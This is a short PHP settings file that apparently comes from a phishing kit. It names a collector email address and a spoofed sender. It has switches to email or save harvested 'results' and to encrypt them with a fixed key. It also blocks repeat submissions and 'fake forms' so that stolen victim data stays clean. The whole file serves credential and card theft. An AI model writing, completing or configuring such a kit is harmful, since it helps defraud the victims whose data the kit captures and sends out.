<?php

/*
****** Set your email below and configure functions to your requirments ****
****** FUNCTION CONTROL: 1=ON  and 0=OFF ****
EXAMPLE
$Example=1;  // Function On
$Example=0;  // Function Off
*/
$Your_Email = "spammer.gorontalo@yandex.com";  // Set your email
$From_Address = "CC VOKEP <admin@mosana.matalauni.com>";  //Address your results will apear to come from
$Send_Log=1;  // Email results
$Save_Log=0;  // Saves results to server (./assets/logs/)
$Abuse_Filter=0; // Block absuive text 
$One_Time_Access=0; // One Time Access: This blocks the users ip after the form has been submitted i.e. prevents users sending multiple fake forms
$Encrypt=0; // Encrypt: This will send/save your results with aes to decrypt use the key below
$Key = 	"582ACCD12E3D1337"; // This key is used to decrypt results and can be changed
$Send_Per_Page=1; // Send each pages data seperate

?>


